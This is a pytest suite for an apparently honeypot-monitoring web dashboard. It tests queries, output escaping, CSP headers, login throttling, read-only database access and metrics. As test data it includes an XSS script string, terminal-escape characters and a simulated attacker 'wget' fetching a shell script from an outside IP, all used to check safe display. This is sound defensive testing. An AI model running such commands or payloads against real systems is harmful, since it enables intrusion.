"""The dashboard: queries on seeded data, then the web layer (auth, CSP, escaping, read-only)."""

import base64
import json
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import func, select, text
from sqlalchemy.exc import OperationalError

pytest.importorskip("flask")

from sample_events import SESSION_A, SESSION_A_EVENTS, SESSION_B_EVENTS, make_event
from surya_kundal.cli import main
from surya_kundal.dashboard import queries
from surya_kundal.dashboard.alerts import recent_alerts
from surya_kundal.dashboard.app import (
    ago,
    create_app,
    project,
    readonly_session_factory,
    stamp,
)
from surya_kundal.database.engine import create_db_engine, init_db, make_session_factory
from surya_kundal.database.models import HoneypotSession, IpGeo, IpIntel
from surya_kundal.ingest import store_events
from surya_kundal.mapping.store import map_pending

NOW = datetime.now(UTC)


@pytest.fixture
def factory(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'k.db'}")
    init_db(engine)
    sessions = make_session_factory(engine)
    with sessions() as db:
        store_events(db, SESSION_A_EVENTS + SESSION_B_EVENTS)
        db.commit()
        map_pending(db)
        db.add(
            IpGeo(
                ip="203.0.113.7",
                country_code="AU",
                city="Sydney",
                latitude=-33.9,
                longitude=151.2,
                looked_up_at=NOW,
            )
        )
        db.add(IpIntel(ip="203.0.113.7", provider="abuseipdb", fetched_at=NOW, score=88))
        db.add(IpIntel(ip="203.0.113.7", provider="tor", fetched_at=NOW, flagged=True))
        db.commit()
    return sessions


@pytest.fixture
def db(factory):
    with factory() as session:
        yield session


def _client(factory, **kwargs):
    return create_app(factory, **kwargs).test_client()


def _basic(password):
    return {"Authorization": "Basic " + base64.b64encode(f":{password}".encode()).decode()}


# --- queries ---------------------------------------------------------------


def test_totals_depth_and_pulse(db):
    t = queries.totals(db)
    assert t.sessions == 2 and t.sources >= 1 and t.commands > 0
    d = queries.depth(db)
    assert d.contact == 2 and d.contact >= d.access >= 0 and d.hands_on <= d.contact
    assert d.action <= d.contact
    count, last = queries.pulse(db)
    assert count == 2 and last is not None
    assert queries.has_data(db)


def test_map_points_countries_and_hourly(db):
    points = queries.map_points(db)
    assert [(p.ip, p.country, p.sessions) for p in points] == [("203.0.113.7", "AU", 2)]
    assert queries.top_countries(db)[0] == ("AU", 2)
    assert len(queries.hourly_activity(db, now=NOW)) == 24
    old = NOW - timedelta(days=400)
    assert sum(queries.hourly_activity(db, now=old)) == 0


def test_sessions_page_filters_and_clamps(db):
    everything = queries.sessions_page(db)
    assert everything.total == 2 and everything.rows[0].country == "AU"
    assert everything.rows[0].abuse == 88 and everything.rows[0].tor is True
    assert queries.sessions_page(db, query=SESSION_A[:4]).total == 1
    assert queries.sessions_page(db, query="198.51").total == 0
    assert queries.sessions_page(db, country="au").total == 2
    assert queries.sessions_page(db, country="us").total == 0
    assert queries.sessions_page(db, page=99, per_page=1).page == 2
    assert queries.sessions_page(db, query="%").total == 0  # LIKE wildcards are not special
    technique = queries.technique_counts(db)[0].technique_id
    assert queries.sessions_page(db, technique=technique).total >= 1


def test_techniques_matrix_and_probes(db):
    counts = queries.technique_counts(db)
    assert counts and counts[0].sessions >= counts[-1].sessions
    assert len(queries.technique_counts(db, limit=1)) == 1
    matrix = queries.attack_matrix(db)
    assert matrix and all(items for _, items in matrix)
    assert queries.probes(db) == [] and queries.probing_sessions(db) == 0


def test_session_detail_by_prefix(db):
    detail = queries.session_detail(db, SESSION_A[:6])
    assert detail is not None and detail.session.id == SESSION_A
    assert detail.geo.country_code == "AU" and detail.abuse == 88
    assert detail.commands and detail.login_total == len(detail.logins)
    assert queries.session_detail(db, "zzzz") is None
    assert queries.session_detail(db, "") is None  # empty prefix matches both: ambiguous


def test_empty_database(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'blank.db'}")
    with make_session_factory(engine)() as db:
        assert queries.has_data(db) is False


# --- helpers ---------------------------------------------------------------


def test_project_ago_stamp():
    assert project(-180, 90) == (0, 0) and project(180, -90) == (960, 480)
    assert project(0, 0) == (480, 240)
    assert ago(None) == "never" and ago(NOW + timedelta(hours=1), NOW) == "just now"
    assert ago(NOW - timedelta(seconds=5), NOW) == "5s ago"
    assert ago(NOW - timedelta(minutes=3), NOW) == "3m ago"
    assert ago(NOW - timedelta(hours=2), NOW) == "2h ago"
    assert ago(NOW - timedelta(days=4), NOW) == "4d ago"
    assert stamp(None) == "-" and stamp(datetime(2026, 1, 2, 3, 4, 5)) == "2026-01-02 03:04:05"


# --- alerts ----------------------------------------------------------------


def _alert(rule_id, desc="d", level=8):
    return json.dumps(
        {
            "timestamp": "2026-10-05T10:00:00Z",
            "rule": {
                "id": str(rule_id),
                "level": level,
                "description": desc,
                "mitre": {"id": ["T1082"]},
            },
            "data": {"src_ip": "1.2.3.4", "input": "uname -a"},
        }
    )


def test_recent_alerts_filters_and_survives_junk(tmp_path):
    path = tmp_path / "a.jsonl"
    path.write_text(
        "\n".join(
            [
                _alert(5710),
                "not json",
                "[]",
                '{"rule": {}}',
                _alert(100601, "x"),
                _alert(100602, "y"),
            ]
        )
        + "\n"
    )
    found = recent_alerts(path, limit=5)
    assert [a.description for a in found] == ["y", "x"]  # newest first, system rules dropped
    assert found[0].techniques == ("T1082",) and found[0].command == "uname -a"
    assert recent_alerts(path, limit=1)[0].description == "y"
    assert recent_alerts(tmp_path / "missing") == [] and recent_alerts(None) == []


def test_recent_alerts_reads_only_the_tail(tmp_path):
    path = tmp_path / "big.jsonl"
    filler = _alert(100601, "old") + "\n"
    path.write_text(filler * 20000 + _alert(100699, "newest") + "\n")
    assert path.stat().st_size > 512 * 1024
    assert recent_alerts(path, limit=1)[0].description == "newest"


# --- web layer -------------------------------------------------------------


def test_pages_render(factory, tmp_path):
    alerts = tmp_path / "a.jsonl"
    alerts.write_text(_alert(100601, "Cowrie: recon") + "\n")
    client = _client(factory, alerts_path=alerts)
    home = client.get("/")
    assert home.status_code == 200
    body = home.get_data(as_text=True)
    assert "Surya Kundal" in body and "Cowrie: recon" in body and "Sydney" in body
    assert client.get("/sessions").status_code == 200
    assert client.get("/sessions?page=abc&q=" + SESSION_A[:4]).status_code == 200
    detail = client.get(f"/sessions/{SESSION_A}")
    assert detail.status_code == 200 and SESSION_A in detail.get_data(as_text=True)
    assert client.get("/attack").status_code == 200
    assert client.get("/sessions/nope").status_code == 404
    assert client.get("/api/pulse").get_json()["sessions"] == 2
    assert client.get("/healthz").get_data(as_text=True) == "ok"


def test_security_headers(factory):
    response = _client(factory).get("/")
    csp = response.headers["Content-Security-Policy"]
    assert "default-src 'none'" in csp and "unsafe" not in csp and "http" not in csp
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert response.headers["Cache-Control"] == "no-store"
    assert " style=" not in response.get_data(as_text=True)  # inline styles would break the CSP


def test_token_required_when_set(factory):
    client = _client(factory, token="s3cret")
    denied = client.get("/")
    assert denied.status_code == 401 and "Basic" in denied.headers["WWW-Authenticate"]
    assert client.get("/", headers=_basic("wrong")).status_code == 401
    assert client.get("/", headers=_basic("s3cret")).status_code == 200
    assert client.get("/api/pulse").status_code == 401
    assert client.get("/healthz").status_code == 200  # liveness probes carry no credentials


def test_attacker_text_is_escaped(factory):
    evil = "<script>alert(1)</script>\x1b[2J‮"
    with factory() as db:
        store_events(
            db,
            [
                make_event("evil1", "cowrie.session.connect", "2026-10-05T10:00:00.000000Z"),
                make_event(
                    "evil1", "cowrie.command.input", "2026-10-05T10:00:05.000000Z", input=evil
                ),
            ],
        )
        db.commit()
    body = _client(factory).get("/sessions/evil1").get_data(as_text=True)
    assert "<script>alert" not in body
    assert "&lt;script&gt;" in body
    assert "\x1b" not in body and "‮" not in body and "\\x1b" in body


def _url(factory):
    return factory.kw["bind"].url.render_as_string(hide_password=False)


def test_dashboard_cannot_write(factory):
    read_only = readonly_session_factory(_url(factory))
    with read_only() as db:
        assert db.scalar(select(func.count()).select_from(HoneypotSession)) == 2
        with pytest.raises(OperationalError, match="readonly"):
            db.execute(text("DELETE FROM sessions"))
    with factory() as check:
        assert check.scalar(select(func.count()).select_from(HoneypotSession)) == 2


def test_readonly_engine_creates_nothing(tmp_path):
    with pytest.raises(FileNotFoundError):
        readonly_session_factory(f"sqlite:///{tmp_path / 'sub' / 'missing.db'}")
    assert not (tmp_path / "sub").exists()


def test_empty_database_shows_guidance(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'blank.db'}")
    client = _client(make_session_factory(engine))
    for path in ("/", "/sessions", "/attack", "/sessions/abc"):
        response = client.get(path)
        assert response.status_code == 200 and "No data yet" in response.get_data(as_text=True)
    assert client.get("/api/pulse").get_json() == {"sessions": 0, "last": None}


# --- CLI -------------------------------------------------------------------


def test_cli_refuses_public_listen_without_token(monkeypatch, capsys):
    monkeypatch.delenv("DASHBOARD_TOKEN", raising=False)
    monkeypatch.chdir("/")  # no .env to pick up
    assert main(["dashboard", "--host", "0.0.0.0"]) == 2  # noqa: S104
    assert "DASHBOARD_TOKEN" in capsys.readouterr().err


def test_cli_serves_with_waitress(monkeypatch, tmp_path, capsys):
    served = {}
    import waitress

    monkeypatch.setattr(waitress, "serve", lambda app, **kw: served.update(kw))
    monkeypatch.setenv("DASHBOARD_TOKEN", "")
    monkeypatch.chdir(tmp_path)
    url = f"sqlite:///{tmp_path / 'x.db'}"
    init_db(create_db_engine(url))
    assert main(["dashboard", "--db", url, "--port", "9999"]) == 0
    assert served["host"] == "127.0.0.1" and served["port"] == 9999
    assert served["max_request_body_size"] == 1024 and served["channel_timeout"] == 30
    assert "http://127.0.0.1:9999" in capsys.readouterr().out


# --- audit fixes -----------------------------------------------------------


def test_wrong_passwords_are_throttled_per_address(factory):
    now = [0.0]
    client = _client(factory, token="s3cret-token", clock=lambda: now[0])
    for _ in range(5):
        assert client.get("/", headers=_basic("wrong")).status_code == 401
    blocked = client.get("/", headers=_basic("s3cret-token"))  # even the right one, for now
    assert blocked.status_code == 429 and blocked.headers["Retry-After"] == "60"
    now[0] = 61.0
    assert client.get("/", headers=_basic("s3cret-token")).status_code == 200
    # asking without credentials is not a failed guess (browsers do it first)
    for _ in range(10):
        assert client.get("/").status_code == 401
    assert client.get("/", headers=_basic("s3cret-token")).status_code == 200


def test_unknown_host_is_refused_without_a_token(factory):
    client = _client(factory)
    assert client.get("/healthz", headers={"Host": "evil.example"}).status_code == 421
    assert client.get("/healthz", headers={"Host": "127.0.0.1:8080"}).status_code == 200
    assert client.get("/healthz", headers={"Host": "[::1]:8080"}).status_code == 200
    custom = _client(factory, allowed_hosts=("dash.lan",))
    assert custom.get("/healthz", headers={"Host": "dash.lan:80"}).status_code == 200
    # with a password the host does not matter: credentials are per origin
    assert (
        _client(factory, token="s3cret-token")
        .get("/healthz", headers={"Host": "evil.example"})
        .status_code
        == 200
    )


def test_overview_is_cached_briefly(factory, monkeypatch):
    now = [0.0]
    calls = []
    real = queries.totals
    monkeypatch.setattr(queries, "totals", lambda d: calls.append(1) or real(d))
    client = _client(factory, clock=lambda: now[0])
    client.get("/")
    client.get("/")
    assert len(calls) == 1
    now[0] = 16.0
    client.get("/")
    assert len(calls) == 2


def test_healthz_reports_a_broken_database(factory):
    app = create_app(factory)
    import surya_kundal.dashboard.app as module

    class Broken:
        def execute(self, *a, **k):
            raise RuntimeError("down")

        def close(self):
            pass

    with app.test_client() as client:
        app.extensions["surya_db"]  # exists
        original = module.queries.has_data
        module.queries.has_data = lambda d: False
        try:
            assert client.get("/healthz").status_code == 200
        finally:
            module.queries.has_data = original
    bad = create_app(lambda: Broken())
    assert bad.test_client().get("/healthz").status_code == 503


def test_banner_count_is_global_on_every_page(factory):
    client = _client(factory)
    body = client.get("/sessions?technique=T9999").get_data(as_text=True)
    assert 'data-count="2"' in body and "data-pulse=" in body


def test_funnel_steps_are_nested(db):
    from surya_kundal.database.models import HoneypotSession, TechniqueMatch

    # a session that only guessed passwords must not count as having "taken action"
    db.add(HoneypotSession(id="guesser-000001", src_ip="9.9.9.9", start_time=NOW))
    db.flush()
    db.add(
        TechniqueMatch(
            session_id="guesser-000001",
            command_id=None,
            technique_id="T1110.001",
            tactics="credential-access",
            rule_id="login-guessing",
            confidence="high",
            evidence="x",
        )
    )
    db.commit()
    d = queries.depth(db)
    assert d.contact == 3
    assert d.contact >= d.access >= d.hands_on >= d.action


def test_unknown_country_filter_and_exact_session_match(db):
    from surya_kundal.database.models import HoneypotSession

    db.add(HoneypotSession(id="nogeo-0000001", src_ip="8.8.8.8", start_time=NOW))
    db.add(HoneypotSession(id="nogeo-0000001-longer", src_ip=None, start_time=NOW))
    db.commit()
    unknown = queries.sessions_page(db, country="unknown")
    assert {r.id for r in unknown.rows} == {"nogeo-0000001", "nogeo-0000001-longer"}
    # the exact ID wins even though it is also a prefix of another session
    assert queries.session_detail(db, "nogeo-0000001").session.id == "nogeo-0000001"
    assert queries.session_detail(db, "nogeo") is None  # too short and not exact
    assert queries.session_detail(db, "nogeo-00000") is None  # ambiguous prefix


def test_session_page_is_bounded(factory):
    from surya_kundal.database.models import Command, HoneypotSession, Login

    with factory() as db:
        db.add(HoneypotSession(id="busy-000000001", src_ip="7.7.7.7", start_time=NOW))
        db.flush()
        db.add_all(
            Command(session_id="busy-000000001", command=f"c{i}", timestamp=NOW) for i in range(700)
        )
        db.add_all(
            Login(
                session_id="busy-000000001",
                username="u",
                password=str(i),
                success=False,
                timestamp=NOW,
            )
            for i in range(300)
        )
        db.commit()
    with factory() as db:
        detail = queries.session_detail(db, "busy-000000001")
        assert detail.command_total == 700 and len(detail.commands) == 500
        assert detail.login_total == 300 and len(detail.logins) == 100
    body = _client(factory).get("/sessions/busy-000000001").get_data(as_text=True)
    assert body.count("Showing the first") == 2


def test_cli_rejects_a_short_token_and_a_missing_database(monkeypatch, tmp_path, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("DASHBOARD_TOKEN", "short")
    assert main(["dashboard"]) == 2
    assert "at least 12" in capsys.readouterr().err
    monkeypatch.setenv("DASHBOARD_TOKEN", "")
    assert main(["dashboard", "--db", f"sqlite:///{tmp_path / 'nope.db'}"]) == 2
    assert "does not exist yet" in capsys.readouterr().err
    assert not (tmp_path / "nope.db").exists()


# --- campaigns pages ---------------------------------------------------------


def test_campaign_pages_list_and_detail_escape_attacker_text(tmp_path):
    from sample_events import SHA, T0, T_DL
    from surya_kundal.campaigns import build_campaigns, list_campaigns

    engine = create_db_engine(f"sqlite:///{tmp_path / 'c.db'}")
    init_db(engine)
    sessions = make_session_factory(engine)
    second = [
        dict(make_event("bbbbbbbbbbbb", "cowrie.session.connect", T0), src_ip="198.51.100.9"),
        dict(
            make_event(
                "bbbbbbbbbbbb",
                "cowrie.session.file_download",
                T_DL,
                url="http://example.com/<script>alert(1)</script>",
                shasum=SHA,
            ),
            src_ip="198.51.100.9",
        ),
    ]
    with sessions() as db:
        store_events(db, SESSION_A_EVENTS + second)
        db.commit()
        build_campaigns(db)
        db.commit()
        rows = list_campaigns(db)
    assert len(rows) == 1
    client = _client(sessions)
    listing = client.get("/campaigns")
    assert listing.status_code == 200 and rows[0].id.encode() in listing.data
    detail = client.get(f"/campaigns/{rows[0].id}")
    assert detail.status_code == 200
    assert b"Why these sessions are grouped" in detail.data
    assert b"<script>alert" not in detail.data
    assert client.get("/campaigns/doesnotexist").status_code == 404


def test_campaign_pages_survive_an_unmigrated_database(tmp_path):
    from sqlalchemy import text as sql

    engine = create_db_engine(f"sqlite:///{tmp_path / 'old.db'}")
    init_db(engine)
    sessions = make_session_factory(engine)
    with sessions() as db:
        store_events(db, SESSION_A_EVENTS)
        db.commit()
        db.execute(sql("DROP TABLE campaign_evidence"))
        db.execute(sql("DROP TABLE campaign_sessions"))
        db.execute(sql("DROP TABLE campaigns"))
        db.commit()
    client = _client(sessions)
    assert client.get("/campaigns").status_code == 200
    assert client.get("/campaigns/abc").status_code == 404


# --- metrics ---------------------------------------------------------------------------------


def test_metrics_exposes_numbers_in_prometheus_format(factory):
    response = _client(factory).get("/metrics")
    body = response.get_data(as_text=True)

    assert response.status_code == 200
    assert response.headers["Content-Type"].startswith("text/plain; version=0.0.4")
    assert "# TYPE surya_kundal_sessions gauge" in body
    values = {
        line.split()[0]: float(line.split()[1])
        for line in body.splitlines()
        if line and not line.startswith("#") and "{" not in line
    }
    assert values["surya_kundal_sessions"] >= 2
    assert values["surya_kundal_last_session_timestamp_seconds"] > 1_700_000_000
    assert values["surya_kundal_database_size_bytes"] > 0
    assert 'surya_kundal_info{version="' in body


def test_metrics_never_contain_text_from_the_data(factory):
    body = _client(factory).get("/metrics").get_data(as_text=True)
    for line in body.splitlines():
        assert line.startswith("#") or line.startswith("surya_kundal_")
    assert "203.0.113" not in body and "root" not in body.replace("# HELP", "")


def test_metrics_need_the_password_when_one_is_set(factory):
    client = _client(factory, token="s3cret-token")
    assert client.get("/metrics").status_code == 401
    assert client.get("/metrics", headers=_basic("wrong-token-xx")).status_code == 401
    assert client.get("/metrics", headers=_basic("s3cret-token")).status_code == 200


def test_metrics_report_zero_for_an_empty_database(tmp_path):
    engine = create_db_engine(f"sqlite:///{tmp_path / 'empty.db'}")
    init_db(engine)
    body = _client(make_session_factory(engine)).get("/metrics").get_data(as_text=True)
    assert "surya_kundal_sessions 0" in body
    assert "surya_kundal_last_session_timestamp_seconds 0" in body


def test_session_page_shows_attempted_downloads_escaped(factory):
    from surya_kundal.database.models import Command

    with factory() as db:
        db.add(
            Command(session_id=SESSION_A, command="wget http://45.33.32.156/<b>.sh", timestamp=NOW)
        )
        db.commit()
        map_pending(db)
    body = _client(factory).get(f"/sessions/{SESSION_A}").get_data(as_text=True)
    assert "Attempted downloads" in body and "45.33.32.156" in body
    assert "<b>" not in body
